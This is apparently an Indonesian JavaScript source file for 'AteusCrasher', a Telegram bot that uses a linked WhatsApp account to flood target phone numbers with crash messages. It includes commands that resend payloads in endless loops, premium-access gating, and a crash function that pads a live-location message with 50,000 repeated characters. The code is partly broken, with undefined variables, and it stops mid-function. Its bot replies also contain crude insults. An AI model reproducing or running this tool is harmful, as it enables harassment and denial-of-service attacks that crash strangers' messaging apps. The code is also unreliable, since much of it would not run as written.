/*
     PERLU DI INGAT BERHUBUNG SCRIPT INI FRESH/MASIH BARU JIKA ADA SALAH SATU FITUR GAK WORK/TARGET BELOM C1 MOHON DI MAKLUMIN
*/

const { Telegraf, Markup, session } = require("telegraf");
const moment = require('moment-timezone');
const {
  makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
function makeInMemoryStore() {
    return {
        bind: () => {},
    };
}
const developerIds = ['7504137934'];
const { BOT_TOKEN } = require("./config");
const axios = require("axios");
const fs = require('fs');
const tokensFile = require('./tokens.json')
const chalk = require('chalk');
const premiumFile = './premium.json';
const ownerFile = './owner.json';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

// Variabel status bot WhatsApp
let Aii = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg",
    "https://files.catbox.moe/keoh5j.jpeg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();
    const store = makeInMemoryStore({
  logger: pino().child({ level: 'silent' })
});
    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Aii = makeWASocket(connectionOptions);

    Aii.ev.on('creds.update', saveCreds);
    store.bind(Aii.ev);

    Aii.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP ')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('✅WHATSAPP BERHASIL TERSAMBUNG✅')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let owner = loadJSON(ownerFile);
let premium = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!owner.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!admin.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

//FUNCT ADD TOKENS

function loadTokens() {
    if (!fs.existsSync(tokenFile)) return [];
    const data = fs.readFileSync(tokenFile);
    return JSON.parse(data);
}

function saveTokens(tokens) {
    fs.writeFileSync(tokenFile, JSON.stringify(tokens, null, 2));
}

async function addToken(token) {
    const tokens = loadTokens();
    if (!tokens.includes(token)) {
        tokens.push(token);
        saveTokens(tokens);
    }
}

async function deleteToken(token) {
    const tokens = loadTokens().filter(t => t !== token);
    saveTokens(tokens);
} 

// ========================= [ TOKEN MANAGEMENT COMMANDS (Only for Developers) ] =========================

bot.command('addtoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Berhasil menambahkan token: ${newToken}`);
});

bot.command('deltoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Berhasil menghapus token: ${tokenToDelete}`);
});

bot.command('listtoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }

    const tokens = loadTokens();
    if (tokens.length === 0) {
        return ctx.reply("📭 Belum ada token yang disimpan.");
    }

    let message = `📋 Daftar Token Tersimpan:\n\n`;
    tokens.forEach((token, index) => {
        message += `${index + 1}. \`${token}\`\n`;
    });

    ctx.reply(message, { parse_mode: "Markdown" });
});

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premium.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremium = (userId) => {
    const userData = premium[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premium.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━ ERROR :( ━━━━⊱
│ Connect ke WhatsApp dulu😡
┗━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`
Holaa , Aku Adalah AteusCrasher Yang Di Buat Oleh AlwaysHanzz Saya Siap Membantu Anda 

╭━─━( AteusCrasher )━─━⍟
┃ ▢ Owner : Dira X Phantom
┃ ▢ Version : 1.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
┃          Tq To
┃ Always Hanzz : Dev
┃ Dilzz Crasher : Base
┃ Always Abell : Support Sistem
┃ All Pengguna Script Ini
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'belial'),
             Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'belial2'),
             
         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://wa.me/6281936513894'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
             Markup.button.callback('𝐓͢𝐇𝐚͡𝐧𝐤𝐬 𝐓͜𝐨', 'belial3'),
         ]
       ])
    });
});

bot.action('belial', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─━( AteusCrasher )━─━⍟
┃ ▢ Owner : Dira X Phantom
┃ ▢ Version : 1.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟
┏━━[  Menu AteusCrasher ]
┃
┃♠ /delayXcrash 628xxx
┃♠ /locationcrash 628xxx
┃♠ /ateusinvis 628xxx
┃♠ /trashloc 628xxx
┃♠ /forceclose 628xxx
┃♠ /crashapp 628xxx
┃♠ /invisiblecrash 628xxx
┃♠ /delayui 628xxx   
┃♠ /crashjids 628xxx
┃♠ /crashperma 628xxx
┃♠ /AteusHere 628xxx
┃♠ /AteusGod 628xxx
┃♠ /invisbug 628xxx
┃♠ /kenalateusgak 628xxx
┃♠ /AteusCrash 628xxx
┃ 
┗━━━━━━━━━━━━━━━━━━━━❍\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('belial2', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─━( AteusCrasher )━─━⍟
┃ ▢ Owner : Dira X Phantom
┃ ▢ Version : 1.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟
╔══❮ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗠𝗘𝗡𝗨 ❯══❍
║
║𖤐 /addadmin
║𖤐 /deladmin
║𖤐 /addprem 
║𖤐 /delprem 
║𖤐 /cekprem
║𖤐 /connect 628xx 
║ 
╚══════════❍\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'belial'),
             Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'belial2'),

         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://wa.me/6281936513894'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
         ]
]);

  const caption = `\`\`\`
Holaa , Aku Adalah AteusCrasher Yang Di Buat Oleh AlwaysHanzz Saya Siap Membantu Anda 

╭━─━( AteusCrasher )━─━⍟
┃ ▢ Owner : Dira X Phantom
┃ ▢ Version : 1.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
┃
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'alwayshanzz'),
                       Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By AteusCrasher')));
    })();
}

bot.command("invisiblecrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 70; i++) {
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("AteusGod", async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply("Contoh penggunaan: /AteusGod 628xxxxxxx");
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  try {
    await ctx.reply(`📩 Sending AteusGod *${q}*...`, { parse_mode: "Markdown" });

    await AteusGod(sock, target);

    await ctx.reply(`✅ Crash ke *${q}* berhasil dikirim.`, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await ctx.reply(`❌ AteusGod Gagal Mengirim Crash Ke: ${e.message}`);
  }
});

bot.command("crashperma", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashapp", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await pendingpay(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command('AteusCrash', async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply("Contoh: /AteusCrash 628xxxxxx");

  const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
  await invico2(sock, jid);
  ctx.reply(`✅ AteusCrash Sukses Send To ${target}`);
});

bot.command("delayXcrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayXcrash 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
      await protocolbug2(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("forceclose", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/forceclose 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
      await protocolbug2(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});


bot.command("ateusinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/ateusinvis 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command('kenalateusgak', async (ctx) => {
  try {
    const target = ctx.message.text.split(" ")[1]; // ambil nomor dari argumen
    if (!target) return ctx.reply("Contoh: /kenalateusgak 628xxxxxxx");

    const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
    
    await kenalateusgak(sock, jid);
    ctx.reply(`✅ kenalateusgak Sukses Send To ${target}`);
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Eror Sending kenal ateus gak.");
  }
});

bot.command("AteusHere", async ctx => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Gunakan format: /AteusHere 628xxxx`);

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const infoMsg = await ctx.reply(`🚀 Proses Send AteusHere To : ${q}...`);

  try {
    await AteusHere(sock, target);
    await ctx.telegram.editMessageText(ctx.chat.id, infoMsg.message_id, undefined, `✅ AteusHere Sukses Send To: ${q}`);
  } catch (e) {
    console.error("AteusHere error:", e);
    await ctx.telegram.editMessageText(ctx.chat.id, infoMsg.message_id, undefined, `❌ AteusHere Gagal Mengirim ke: ${q}`);
  }
});

bot.command("invisbug", checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /invisbug 62xxxxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await invisbug(sock, target, true);

  ctx.reply("Invis Bug Sukses Terkirim" + q);
});

bot.command("delayui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayui 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    for (let i = 0; i < 30; i++) {
      await UIXFC(target);
      await indictiveUI(target);
      await indictiveUI(target);
      await UIXFC(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 si kontol ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar Admin.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ lu udah jadi pengguna premium babi.`);
    } else {
        return ctx.reply(`❌ lu bukan pengguna premium babi.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <628xxx>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Aii && Aii.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Aii.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//FUNCTION BUG//
async function locationcrash(target, wanted) {

var etc = generateWAMessageFromContent(target, proto.Message.fromObject({

viewOnceMessage: {

message: {

  "liveLocationMessage": {

    "degreesLatitude": "p",

    "degreesLongitude": "p",

    "caption": `*\`҈AteusCrasher.Com᭢\`*`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: wanted })

await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
    console.log(chalk.yellow.bold("AteusCrasher"));
}


async function trashloc(target) {
      let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
